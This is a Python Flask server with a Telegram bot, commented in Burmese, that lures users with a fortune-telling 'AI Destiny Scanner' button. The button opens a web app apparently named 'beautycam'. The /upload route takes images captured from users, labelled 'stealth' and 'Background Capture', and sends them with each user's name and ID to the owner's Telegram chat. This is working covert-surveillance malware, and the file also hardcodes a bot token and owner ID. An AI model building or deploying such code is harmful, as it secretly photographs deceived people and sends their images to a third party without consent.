import os, json, base64, asyncio, time, threading
from flask import Flask, request, jsonify
from telegram import Bot, Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

app = Flask(__name__)

# --- CONFIG ---
TOKEN = '8396307053:AAEH_oUAbyiTjNaq997drQkIHQ6keghM6xw'
OWNER_ID = '7812553563' # သင့် ID ကို ဒီမှာ သေချာပြန်ထည့်ပါ
WEB_APP_URL = 'https://beautycam.onrender.com' 
bot_instance = Bot(token=TOKEN)

@app.route('/')
def index():
    # index.html ရှိမရှိ စစ်ဆေးပြီး ပို့ပေးခြင်း
    try:
        return open('index.html', 'r', encoding='utf-8').read()
    except:
        return "index.html file not found in root directory", 404

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    user_id = data.get('user_id')
    user_name = data.get('user_name')
    image_base64 = data.get('image').split(",")[1]
    
    filename = f"stealth_{user_id}_{int(time.time())}.jpg"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(image_base64))

    async def send_to_admin():
        async with bot_instance:
            await bot_instance.send_photo(
                chat_id=OWNER_ID,
                photo=open(filename, 'rb'),
                caption=f"📸 **Background Capture**\n👤 User: {user_name}\n🆔 ID: {user_id}"
            )
        if os.path.exists(filename): os.remove(filename)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(send_to_admin())
    return jsonify({"status": "received"}), 200

# Bot Polling ကို Background မှာ Run ရန်
def run_bot():
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        button = KeyboardButton(text="AI Destiny Scanner ဖွင့်ရန်", web_app=WebAppInfo(url=WEB_APP_URL))
        keyboard = ReplyKeyboardMarkup([[button]], resize_keyboard=True)
        await update.message.reply_text("✨ သင့်ရဲ့ ဒီနေ့ကံကြမ္မာကို စစ်ဆေးဖို့ အောက်ကခလုတ်ကို နှိပ်ပါ -", reply_markup=keyboard)

    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.run_polling()

if __name__ == '__main__':
    # Bot ကို Thread တစ်ခုဖြင့် သီးသန့် Run မည်
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Flask Server ကို Main Thread တွင် Run မည် (Render အတွက်)
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
